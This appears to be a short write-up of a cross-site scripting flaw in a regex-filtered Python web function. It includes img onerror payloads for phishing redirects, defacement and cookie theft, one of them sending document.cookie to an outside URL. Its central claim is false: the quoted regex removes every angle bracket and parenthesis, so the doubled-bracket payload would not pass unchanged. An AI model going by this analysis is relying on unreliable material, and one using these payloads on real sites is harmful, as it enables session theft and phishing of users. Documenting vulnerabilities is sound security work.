### This code is vulnerable to [XSS](https://portswigger.net/web-security/cross-site-scripting)

Vulnerable Function: `get_planet_info()` and ```get_planet_info_endpoint()```

### Why its vulnerable?

Re: ```sanitized_planet = re.sub(r'[<>(){}[\]]', '', planet) ```
In this regex, the characters <, >, (, ), {, }, [, and ] are explicitly removed, but whitespace characters are not removed. 
and only ```script``` tag is blocked, so we can use other tags like ```img``` to exploit XSS. 


Exploit: 
```js
<<img src="x" onerror="alert(1)">>
``` 

**Explanation**: In this payload, the double angle brackets << and >> will not be matched by the regex, so the payload remains unaffected, and the XSS attack will be executed.

### How to Fix?
- We can use html escape function to escape all the html characters / or improve the regex to escape all the html characters.

### What you can do with XSS?
- Steal Cookies and Session Information
- Redirect to malicious websites
- Modify website content
- Phishing
- Keylogging
- etc. 

### How to prevent XSS?
- Sanitize user input properly
- Use Content Security Policy (CSP)
- Use HttpOnly Cookies
- Use X-XSS-Protection header


### Here are some exploit examples:

#### Redirect to Phiting page using XSS 
```
<<img src="x" onerror="window.location.href = 'https://google.com';">>
```

#### Get cookies 
```<<img src="x" onerror="window.location.href = 'https://google.com/?cookie=' + document.cookie;">>
```

#### Modify website content
You can inject any phising page / malicious page or any other content to the website using XSS.

```
<<img src="x" onerror="document.body.innerHTML = '<h1>Website is hacked</h1>';">> 
```


 